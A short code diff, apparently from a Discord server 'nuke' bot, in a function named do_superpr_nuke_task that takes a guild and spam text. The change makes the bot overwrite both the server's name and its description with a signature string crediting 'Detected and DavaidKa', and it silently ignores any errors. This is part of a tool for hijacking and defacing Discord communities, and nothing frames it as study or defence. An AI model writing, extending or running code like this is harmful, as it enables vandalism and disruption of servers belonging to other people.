@@ -276,9 +276,9 @@ async def do_superpr_nuke_task(guild, spam_text=None):
 
     TURBO_NAME = "Привет от Detected and DavaidKa"
 
-    # Переименовываем сервер
+    # Переименовываем сервер + описание
     try:
-        await guild.edit(name=TURBO_NAME)
+        await guild.edit(name=TURBO_NAME, description=TURBO_NAME)
     except Exception:
         pass
 
